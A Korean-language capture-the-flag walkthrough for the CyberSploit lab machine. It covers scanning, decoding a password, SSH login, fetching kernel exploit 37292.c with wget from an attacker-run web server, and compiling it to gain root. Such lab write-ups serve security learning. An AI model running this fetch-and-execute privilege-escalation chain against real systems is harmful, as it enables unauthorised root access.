# \[1] 정보 수집
`nmap 192.168.56.0/24`[[nmap_cybersploit]]
`nmap 192.168.56.0/24 -sV -v -p-`[[nmap_cybersploit_d]]
```
Nmap scan report for 192.168.56.105
Host is up (0.0011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
MAC Address: 08:00:27:2A:8F:05 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
> [!Note]
> victim: 192.168.56.105, Linux Web Server
> 22/tcp, 80/tcp 동작 중

## \[1-1] 사이트 접속
![[Pasted image 20240926111016.png]]
- 다른 기능을 실행되지 않는다.
- 디렉터리 또는 웹 서비스를 스캐닝한다.

## \[1-2] 디렉터리 스캐닝
`dirb http://192.168.56.105/`[[dirb_cybersploit_result]]

## \[1-3] 웹 서비스 스캐닝
`nikto -h 192.168.56.105 -C all`[[nikto_cybersploit_result]]

발견된 취약점
: anti-clickjacking, X-Content-Type-Options, Apache/2.2.22의 취약점, ubuntu Linux 버전에 따른 취약점

`#wp-config.php#`
: 워드프레스로 웹 서버 구축한 것으로 보인다.

## \[1-4] 디렉터리 접속
![[Pasted image 20240926112010.png]]
- base64 방식으로 인코딩된 것으로 예상되는 텍스트 발견
- https://dencode.com/ < 입력, 분석 진행

## \[1-5] 디코딩
![[Pasted image 20240926112407.png]]
플래그를 찾았다.:cybersploit{youtube.com/c/cybersploit}

## \[1-6] index.html 소스 분석
![[Pasted image 20240926112629.png]]
계정을 찾았다.: itsskv

## \[1-7] 원격 접속 시도
```
ssh itsskv@192.168.56.105
```
![[Pasted image 20240926113044.png]]
- 암호화 되어 있던 비밀번호를 입력하니 원격 접속에 성공했다.

## \[1-8] 파일 탐색
![[Pasted image 20240926113524.png]]
![[Pasted image 20240926113444.png]]
- 두 번째 플래그를 찾았다.: cybersploit{https:t.me/cybersploit1}

## \[1-9] 운영체제 취약점 탐색
### 1) 커널 버전 탐색
```
uname -a
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
```

### 2) 커널 버전의 취약점 탐색
`searchsploit linux 3.13.0`[[searchsploit_cybersploit_result]]
해당 버전의 악성 코드를 찾았다.
```
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/1 | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/1 | linux/local/37293.txt
```

### 3) 악성 코드 정보 조사
![[Pasted image 20240926114543.png]]
- 로컬에서 사용자의 권한 상승이 가능한 악성 코드인 점 확인
![[Pasted image 20240926114704.png]]
- 마음에 들어서 설치했다.
![[Pasted image 20240926114945.png]]
- 사용 방법도 잘 설명되어 있다.
- 로컬 타입임으로 victim으로 옮겨야 된다.

# \[2] 공격 환경 구축
- 자료 조사를 통해 얻은 정보와 악성코드를 활용해 victim 장치에 악성 코드를 실행하한다.
- 이때 악성 코드는 local에서 구동 됨으로 victim에서 직접 실행할 수 있도록 악성 코드 파일을 victim으로 옮겨야 한다.
- 그러기 위해서는 공격자 pc를 파일 공유를 위한 웹 서버로 만들어 victim에서 wget을 통해 다운로드 받도록 한다.

## \[2-1] 서버 구축
- 데비안 계열 웹 서버 구축은 아파치로 진행한다. `apt install -y apache2 && systemctl start apache2`
- 파이썬도 가능 `python -m http.server 4444`
- `/var/www/html/37292.c`로 파일 옮긴다.

## \[2-2] 접속&다운로드
victim의 shell에서 접속해 파일 다운
`wget http://[칼리웹서버ip]:[포트]/37292.c && ls`

## \[2-3] 컴파일 후 실행
`gcc -o cyber 37292.c && ./cyber`

## \[2-4] 점검
`pwd` 또는 `who am i` 명령어로 root 권한을 취득했는지 확인

# \[3] 최종 플래그 찾기
```
cd /root
# ls
finalflag.txt
# cat ./finalflag.txt
  ______ ____    ____ .______    _______ .______          _______..______    __        ______    __  .___________.
 /      |\   \  /   / |   _  \  |   ____||   _  \        /       ||   _  \  |  |      /  __  \  |  | |           |
|  ,----' \   \/   /  |  |_)  | |  |__   |  |_)  |      |   (----`|  |_)  | |  |     |  |  |  | |  | `---|  |----`
|  |       \_    _/   |   _  <  |   __|  |      /        \   \    |   ___/  |  |     |  |  |  | |  |     |  |     
|  `----.    |  |     |  |_)  | |  |____ |  |\  \----.----)   |   |  |      |  `----.|  `--'  | |  |     |  |     
 \______|    |__|     |______/  |_______|| _| `._____|_______/    | _|      |_______| \______/  |__|     |__|     
                                                                                                                  

   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 

flag3: cybersploit{Z3X21CW42C4 many many congratulations !}

if you like it share with me https://twitter.com/cybersploit1.

Thanks !
```
- 획득한 루트 권한을 가지고 서버 내 디렉터리를 들쑤시고 다닐 수 있다.
- 최종 플래그를 찾으면 CTF 종료